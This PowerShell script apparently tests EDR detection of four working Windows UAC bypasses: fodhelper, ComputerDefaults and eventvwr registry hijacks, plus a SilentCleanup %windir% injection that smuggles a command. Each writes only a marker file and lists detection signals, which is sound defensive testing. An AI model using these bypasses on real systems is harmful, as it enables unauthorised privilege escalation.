<#
.SYNOPSIS
    Technique 3.2: UAC Bypass (T1548.002)

.DESCRIPTION
    Four subtests covering different UAC bypass mechanisms, all requiring only
    standard user rights to attempt (UAC bypass by definition does not require
    existing elevation).

    Subtest 1 (Fodhelper)        - ms-settings HKCU registry key hijack.
                                     fodhelper.exe is auto-elevate; before launching
                                     it reads HKCU\Software\Classes\ms-settings\shell\open\command.
                                     Writing a payload there causes fodhelper to ShellExecute
                                     it at high integrity with no UAC prompt.

    Subtest 2 (Eventvwr)         - mscfile HKCU registry key hijack.
                                     eventvwr.exe auto-elevates and opens eventvwr.msc; it
                                     checks HKCU\Software\Classes\mscfile\shell\open\command
                                     before HKLM. Payload there runs at high integrity.
                                     Tests whether rules key on the binary name (fodhelper)
                                     or the bypass class.

    Subtest 3 (ComputerDefaults) - Same ms-settings key as Fodhelper but via
                                     ComputerDefaults.exe. Tests whether detection rules
                                     alert on the binary name or the registry key pattern.

    Subtest 4 (SilentCleanup)   - DiskCleanup scheduled task + %%windir%% env-var
                                     injection. The SilentCleanup task runs elevated for
                                     the current user. It executes %%windir%%\system32\
                                     cleanmgr.exe; overriding %%windir%% in the process
                                     environment redirects that to our payload.
                                     No registry keys written - different detection surface.

    All subtests write a marker file to C:\Windows\Temp\ as proof-of-execution.
    Writing to C:\Windows\Temp requires admin rights; a successful bypass means the
    marker appears, a blocked bypass means it does not.
    Nothing malicious runs - benign file writes only.
    All registry / environment changes are restored after each subtest.

.PARAMETER Subtest
    Which subtest to run. Use 'All' to run all four sequentially.
    Default: Fodhelper.

.EXAMPLE
    .\v3.2-uac-bypass.ps1 -Subtest Fodhelper
    .\v3.2-uac-bypass.ps1 -Subtest All
#>

param(
    [ValidateSet('Fodhelper','Eventvwr','ComputerDefaults','SilentCleanup','All')]
    [Alias('Technique')]
    [string]$Subtest = 'Fodhelper',
    [switch]$NoCleanupPrompt,
    [switch]$NoPause
)

$tempDir        = "C:\Windows\Temp"
$mssettingsPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
$mscfilePath    = "HKCU:\Software\Classes\mscfile\shell\open\command"

# ==============================================================================
# HELPERS
# ==============================================================================

function Write-Header {
    param([string]$Title, [string]$Detection)
    Write-Host ("`n" + ("="*90)) -ForegroundColor Magenta
    Write-Host "  SUBTEST: $Title" -ForegroundColor Magenta
    Write-Host "  DETECTION DIFFICULTY: $Detection" -ForegroundColor Magenta
    Write-Host ("="*90) -ForegroundColor Magenta
}

function Get-EncodedCommand {
    param([string]$Command)
    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
}

function Test-IsHighIntegrity {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $integritySid = @($identity.Groups | ForEach-Object { $_.Value } |
        Where-Object { $_ -match '^S-1-16-\d+$' } | Select-Object -First 1)
    if ($integritySid.Count -eq 0) { return $false }

    $integrityLevel = [int]($integritySid[0] -split '-')[-1]
    return $integrityLevel -ge 12288 # High, System, or Protected Process
}

function Initialize-TestMarker {
    param([Parameter(Mandatory)][string]$Name)

    $marker = "$tempDir\art-v3.2-$Name.txt"
    Remove-Item -LiteralPath $marker -Force -ErrorAction SilentlyContinue
    return $marker
}

function Test-ExecutionResult {
    param(
        [string]$Name,
        [int]$TimeoutSeconds = 5
    )

    $marker = "$tempDir\art-v3.2-$Name.txt"
    $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
    do {
        if (Test-Path -LiteralPath $marker) {
            Write-Host "[+] OBSERVED: Payload marker created - $marker" -ForegroundColor Green
            return $true
        }
        Start-Sleep -Milliseconds 250
    } while ((Get-Date) -lt $deadline)

    Write-Host "[?] NOT OBSERVED: No payload marker within $TimeoutSeconds seconds - $marker" -ForegroundColor Yellow
    return $false
}

function Invoke-Cleanup {
    param([string[]]$Names)
    foreach ($n in $Names) {
        Remove-Item "$tempDir\art-v3.2-$n.txt" -Force -ErrorAction Ignore
    }
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
    Remove-Item "HKCU:\Software\Classes\mscfile"     -Recurse -Force -ErrorAction Ignore
    Remove-Item "$env:TEMP\sct-silentcleanup.bat"    -Force -ErrorAction Ignore
    Write-Host "[+] Cleanup complete" -ForegroundColor Green
}

# ==============================================================================
# SUBTEST 1: fodhelper.exe + ms-settings registry hijack
# Atomic Red Team: T1548.002 Test #1
# ==============================================================================

function Test-Fodhelper {
    Write-Header "UAC Bypass via fodhelper.exe + ms-settings Registry Hijack (Atomic Test #1)" "MEDIUM"
    Write-Host "`nBinary : C:\Windows\System32\fodhelper.exe"
    Write-Host "Method : fodhelper.exe carries the auto-elevate manifest attribute. Before it"
    Write-Host "         launches, Windows checks HKCU\Software\Classes\ms-settings\shell\open\command"
    Write-Host "         (user hive, no admin needed to write). If that key exists, the value is"
    Write-Host "         ShellExecuted at the elevated integrity of fodhelper - no UAC dialog shown."
    Write-Host "         DelegateExecute must be present (even empty) to trigger the lookup."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 13  - RegistryEvent (Value Set): ms-settings\shell\open\command written by user process"
    Write-Host "  Sysmon 1   - fodhelper.exe spawning unexpected child (not a Settings extension)"
    Write-Host "  EDR alert  - High-integrity child of fodhelper.exe; parent not explorer.exe"
    Write-Host "  SIEM rule  - Process create: IntegrityLevel=High; parent=fodhelper.exe"

    $marker  = Initialize-TestMarker -Name 'Fodhelper'
    $cmd     = "Set-Content -Path '$marker' -Value ('[' + (Get-Date) + '] Fodhelper UAC bypass executed')"
    $encoded = Get-EncodedCommand $cmd
    $payload = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded"

    Write-Host "`n[*] Writing ms-settings payload to HKCU registry..." -ForegroundColor Yellow
    Write-Host "    Key  : $mssettingsPath" -ForegroundColor DarkGray
    Write-Host "    (default)      = powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand [b64]" -ForegroundColor DarkGray
    Write-Host "    DelegateExecute= (empty string - required to activate lookup)" -ForegroundColor DarkGray
    Write-Host "    [Detection: Sysmon 13 - RegistryEvent on ms-settings\shell\open\command]" -ForegroundColor DarkGray
    try {
        New-Item -Path $mssettingsPath -Force | Out-Null
        Set-ItemProperty  -Path $mssettingsPath -Name "(default)"      -Value $payload   -ErrorAction Stop
        New-ItemProperty  -Path $mssettingsPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
        Write-Host "    Registry key written." -ForegroundColor Green
    } catch {
        Write-Host "  RESULT: Registry write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Launching fodhelper.exe (auto-elevates; reads ms-settings key)..." -ForegroundColor Yellow
    Write-Host "    [Detection: Sysmon 1 - fodhelper.exe -> powershell.exe at High integrity]" -ForegroundColor DarkGray
    try {
        Start-Process "C:\Windows\System32\fodhelper.exe" -ErrorAction Stop
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
        return $false
    }

    $result = Test-ExecutionResult -Name "Fodhelper"

    Write-Host "`n[*] Removing ms-settings registry key..." -ForegroundColor Yellow
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
    Write-Host "    Registry key removed." -ForegroundColor DarkGray

    return $result
}

# ==============================================================================
# SUBTEST 2: eventvwr.exe + mscfile registry hijack
# Atomic Red Team: T1548.002 Test #2
# ==============================================================================

function Test-Eventvwr {
    Write-Header "UAC Bypass via eventvwr.exe + mscfile Registry Hijack (Atomic Test #2)" "MEDIUM"
    Write-Host "`nBinary : C:\Windows\System32\eventvwr.exe"
    Write-Host "Method : Event Viewer auto-elevates and opens eventvwr.msc on launch."
    Write-Host "         Windows resolves the .msc shell handler via:"
    Write-Host "           HKCU\Software\Classes\mscfile\shell\open\command  (checked first)"
    Write-Host "           HKCR\mscfile\shell\open\command                   (fallback)"
    Write-Host "         Placing a payload in the HKCU key intercepts the lookup before HKLM."
    Write-Host "         No DelegateExecute value needed for this subtest."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 13  - RegistryEvent (Value Set): mscfile\shell\open\command written by user process"
    Write-Host "  Sysmon 1   - eventvwr.exe spawning unexpected child (expected child: mmc.exe)"
    Write-Host "  EDR alert  - High-integrity child of eventvwr.exe that is not mmc.exe"
    Write-Host "  Rule gap   - If rules only watch fodhelper parent, this bypasses them"

    $marker  = Initialize-TestMarker -Name 'Eventvwr'
    $cmd     = "Set-Content -Path '$marker' -Value ('[' + (Get-Date) + '] Eventvwr UAC bypass executed')"
    $encoded = Get-EncodedCommand $cmd
    $payload = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded"

    Write-Host "`n[*] Writing mscfile payload to HKCU registry..." -ForegroundColor Yellow
    Write-Host "    Key  : $mscfilePath" -ForegroundColor DarkGray
    Write-Host "    (default) = powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand [b64]" -ForegroundColor DarkGray
    Write-Host "    [Detection: Sysmon 13 - RegistryEvent on mscfile\shell\open\command]" -ForegroundColor DarkGray
    try {
        New-Item -Path $mscfilePath -Force | Out-Null
        Set-ItemProperty -Path $mscfilePath -Name "(default)" -Value $payload -ErrorAction Stop
        Write-Host "    Registry key written." -ForegroundColor Green
    } catch {
        Write-Host "  RESULT: Registry write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Launching eventvwr.exe (auto-elevates; reads mscfile key)..." -ForegroundColor Yellow
    Write-Host "    [Detection: Sysmon 1 - eventvwr.exe -> powershell.exe at High integrity (not mmc.exe)]" -ForegroundColor DarkGray
    try {
        Start-Process "C:\Windows\System32\eventvwr.exe" -ErrorAction Stop
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction Ignore
        return $false
    }

    $result = Test-ExecutionResult -Name "Eventvwr"

    Write-Host "`n[*] Removing mscfile registry key..." -ForegroundColor Yellow
    Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction Ignore
    Write-Host "    Registry key removed." -ForegroundColor DarkGray

    return $result
}

# ==============================================================================
# SUBTEST 3: ComputerDefaults.exe + ms-settings registry hijack
# Atomic Red Team: T1548.002 Test #3
# ==============================================================================

function Test-ComputerDefaults {
    Write-Header "UAC Bypass via ComputerDefaults.exe + ms-settings Registry Hijack (Atomic Test #3)" "MEDIUM"
    Write-Host "`nBinary : C:\Windows\System32\ComputerDefaults.exe"
    Write-Host "Method : ComputerDefaults.exe is a second auto-elevate binary that reads the"
    Write-Host "         same HKCU ms-settings\shell\open\command key as fodhelper.exe."
    Write-Host "         This subtest checks whether EDR/SIEM rules are keyed specifically"
    Write-Host "         on 'fodhelper.exe' as the parent, or on the registry key pattern."
    Write-Host "         If subtest 1 fires an alert but this does not, the rule is too narrow."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 13  - RegistryEvent (Value Set): ms-settings\shell\open\command written"
    Write-Host "  Sysmon 1   - ComputerDefaults.exe spawning unexpected child process"
    Write-Host "  EDR alert  - High-integrity child of ComputerDefaults.exe"
    Write-Host "  Rule gap   - Alert fires on fodhelper parent but not ComputerDefaults parent"

    $marker  = Initialize-TestMarker -Name 'ComputerDefaults'
    $cmd     = "Set-Content -Path '$marker' -Value ('[' + (Get-Date) + '] ComputerDefaults UAC bypass executed')"
    $encoded = Get-EncodedCommand $cmd
    $payload = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded"

    Write-Host "`n[*] Writing ms-settings payload to HKCU registry..." -ForegroundColor Yellow
    Write-Host "    Key  : $mssettingsPath" -ForegroundColor DarkGray
    Write-Host "    (default)       = powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand [b64]" -ForegroundColor DarkGray
    Write-Host "    DelegateExecute = (empty string)" -ForegroundColor DarkGray
    Write-Host "    [Detection: Sysmon 13 - RegistryEvent on ms-settings\shell\open\command]" -ForegroundColor DarkGray
    try {
        New-Item -Path $mssettingsPath -Force | Out-Null
        Set-ItemProperty  -Path $mssettingsPath -Name "(default)"       -Value $payload -ErrorAction Stop
        New-ItemProperty  -Path $mssettingsPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
        Write-Host "    Registry key written." -ForegroundColor Green
    } catch {
        Write-Host "  RESULT: Registry write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Launching ComputerDefaults.exe (auto-elevates; reads ms-settings key)..." -ForegroundColor Yellow
    Write-Host "    [Detection: Sysmon 1 - ComputerDefaults.exe -> powershell.exe at High integrity]" -ForegroundColor DarkGray
    try {
        Start-Process "C:\Windows\System32\ComputerDefaults.exe" -ErrorAction Stop
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
        return $false
    }

    $result = Test-ExecutionResult -Name "ComputerDefaults"

    Write-Host "`n[*] Removing ms-settings registry key..." -ForegroundColor Yellow
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
    Write-Host "    Registry key removed." -ForegroundColor DarkGray

    return $result
}

# ==============================================================================
# SUBTEST 4: SilentCleanup scheduled task + %windir% environment variable abuse
# Atomic Red Team: T1548.002 Test #9
# ==============================================================================

function Test-SilentCleanup {
    Write-Header "UAC Bypass via SilentCleanup Task + %%windir%% Env-Var Injection (Atomic Test #9)" "HIGH"
    Write-Host "`nTask   : \Microsoft\Windows\DiskCleanup\SilentCleanup"
    Write-Host "Method : The SilentCleanup scheduled task runs as the current user with"
    Write-Host "         RunLevel=HighestAvailable (auto-elevates without a UAC prompt)."
    Write-Host "         Its action is: %%windir%%\system32\cleanmgr.exe /autoclean /d %%systemdrive%%"
    Write-Host "         Overriding %%windir%% in the process environment before triggering"
    Write-Host "         the task redirects path resolution so the action becomes:"
    Write-Host "           cmd /c <payload> &REM\system32\cleanmgr.exe /autoclean /d c:"
    Write-Host "         No registry keys written. Different detection surface from tests 1-3."
    Write-Host "         %%windir%% is restored immediately after the task is triggered."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 1   - schtasks.exe /Run /TN SilentCleanup; unusual child of task host"
    Write-Host "  EDR alert  - SilentCleanup task spawning non-cleanmgr.exe child at High integrity"
    Write-Host "  SIEM rule  - Process create: task=SilentCleanup; child!=cleanmgr.exe"
    Write-Host "  Hunt       - Unusual %%windir%% env value in process that triggers schtasks"

    $marker      = Initialize-TestMarker -Name 'SilentCleanup'
    $cmd         = "Set-Content -Path '$marker' -Value ('[' + (Get-Date) + '] SilentCleanup UAC bypass executed')"
    $encoded     = Get-EncodedCommand $cmd
    # cmd /c runs: powershell ... -EncodedCommand [b64] & REM\system32\cleanmgr.exe /autoclean /d c:
    # '& REM' terminates the payload command; REM comments out the cleanmgr path remainder.
    $hijackedDir = "cmd /c powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded & REM"

    Write-Host "`n[*] Reading current %%windir%% for restore..." -ForegroundColor Yellow
    $savedWinDir = $env:windir
    Write-Host "    Current: $savedWinDir" -ForegroundColor DarkGray

    Write-Host "`n[*] Overriding %%windir%% in current process environment..." -ForegroundColor Yellow
    Write-Host "    New %%windir%%: cmd /c powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand [b64] & REM" -ForegroundColor DarkGray
    Write-Host "    Task action expands to: <payload> & REM\system32\cleanmgr.exe /autoclean /d c:" -ForegroundColor DarkGray
    Write-Host "    cmd.exe splits on '&': payload runs first; 'REM\system32\...' is a no-op comment." -ForegroundColor DarkGray
    Write-Host "    [Detection: unusual %%windir%% value in process env before schtasks call]" -ForegroundColor DarkGray
    $env:windir = $hijackedDir

    Write-Host "`n[*] Triggering SilentCleanup task (inherits modified process environment)..." -ForegroundColor Yellow
    Write-Host "    Command: schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup" -ForegroundColor DarkGray
    Write-Host "    [Detection: Sysmon 1 - SilentCleanup task host spawning powershell.exe at High integrity]" -ForegroundColor DarkGray
    try {
        Start-Process schtasks.exe -ArgumentList @("/Run", "/TN", "\Microsoft\Windows\DiskCleanup\SilentCleanup") -Wait -ErrorAction Stop
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        $env:windir = $savedWinDir
        return $false
    }

    # Restore windir before checking result - task has already been triggered
    $env:windir = $savedWinDir
    Write-Host "    %%windir%% restored to: $savedWinDir" -ForegroundColor DarkGray

    return (Test-ExecutionResult -Name "SilentCleanup")
}

# ==============================================================================
# RUN ALL
# ==============================================================================

function Test-All {
    Write-Host "`n+==============================================================================+" -ForegroundColor Cyan
    Write-Host "|   UAC BYPASS - ALL SUBTESTS                                                 |" -ForegroundColor Cyan
    Write-Host "+==============================================================================+" -ForegroundColor Cyan

    $tests = @(
        @{ Name = 'Fodhelper';        Fn = ${function:Test-Fodhelper}        },
        @{ Name = 'Eventvwr';         Fn = ${function:Test-Eventvwr}         },
        @{ Name = 'ComputerDefaults'; Fn = ${function:Test-ComputerDefaults} },
        @{ Name = 'SilentCleanup';    Fn = ${function:Test-SilentCleanup}    }
    )

    $results = @()
    foreach ($t in $tests) {
        $results += @{ Name = $t.Name; Success = (& $t.Fn) }
        if (-not $NoPause) {
            Write-Host "`n[!] Check EDR/AV console before continuing." -ForegroundColor Yellow
            [void](Read-Host "    Press Enter for next subtest")
        }
    }
    return $results
}

# ==============================================================================
# REPORT
# ==============================================================================

function Write-Report {
    param([array]$Results)
    Write-Host "`n+==============================================================================+" -ForegroundColor Cyan
    Write-Host "|                        OBSERVATION REPORT                                   |" -ForegroundColor Cyan
    Write-Host "+==============================================================================+" -ForegroundColor Cyan
    foreach ($r in $Results) {
        $label = if ($r.Success) { "OBSERVED" } else { "NOT OBSERVED" }
        $color = if ($r.Success) { 'Green' }   else { 'Yellow' }
        Write-Host "  [$label] $($r.Name)" -ForegroundColor $color
    }
    $ok    = ($Results | Where-Object { $_.Success }).Count
    $total = $Results.Count
    Write-Host "`n  $ok of $total UAC bypass payloads observed" -ForegroundColor Cyan
}

# ==============================================================================
# MAIN
# ==============================================================================

Write-Host "`n[TEST] UAC Bypass (Technique 3.2)" -ForegroundColor Cyan
Write-Host "  MITRE: T1548.002  |  Phase 3  |  Privilege Escalation`n"

# This preflight is specific to UAC bypass testing. Other SCT techniques may
# correctly require elevation; this one must start at Medium integrity to
# measure an attempted privilege transition.
if (Test-IsHighIntegrity) {
    Write-Host '[!] NOT RUN: UAC-bypass testing must start from a Medium-integrity PowerShell session.' -ForegroundColor Yellow
    Write-Host '    Close this elevated console, open PowerShell normally, then rerun the test.' -ForegroundColor Yellow
    exit 2
}

switch ($Subtest) {
    'All' {
        $results = Test-All
        Write-Report -Results $results
        Write-Host "`n[*] Marker files in $tempDir (art-v3.2-*.txt) left for review." -ForegroundColor Yellow
        if (-not $NoCleanupPrompt) {
            $c = Read-Host "Clean up now? (Y/N)"
            if ($c -eq 'Y' -or $c -eq 'y') {
                Invoke-Cleanup -Names @('Fodhelper','Eventvwr','ComputerDefaults','SilentCleanup')
            }
        }
    }
    default {
        Write-Host "+==============================================================================+" -ForegroundColor Cyan
        Write-Host "|   SINGLE SUBTEST: $Subtest" -ForegroundColor Cyan
        Write-Host "+==============================================================================+" -ForegroundColor Cyan
        Write-Host "`n[!] Have EDR/AV console visible before proceeding." -ForegroundColor Yellow
        Read-Host "    Press Enter to start"

        $success = switch ($Subtest) {
            'Fodhelper'        { Test-Fodhelper        }
            'Eventvwr'         { Test-Eventvwr         }
            'ComputerDefaults' { Test-ComputerDefaults }
            'SilentCleanup'    { Test-SilentCleanup    }
        }

        $color = if ($success) { 'Green' } else { 'Yellow' }
        Write-Host "`n[RESULT] Subtest '$Subtest': $(if ($success) { 'OBSERVED' } else { 'NOT OBSERVED' })" -ForegroundColor $color
        if (-not $NoCleanupPrompt) {
            $c = Read-Host "Clean up now? (Y/N)"
            if ($c -eq 'Y' -or $c -eq 'y') { Invoke-Cleanup -Names @($Subtest) }
        }
    }
}
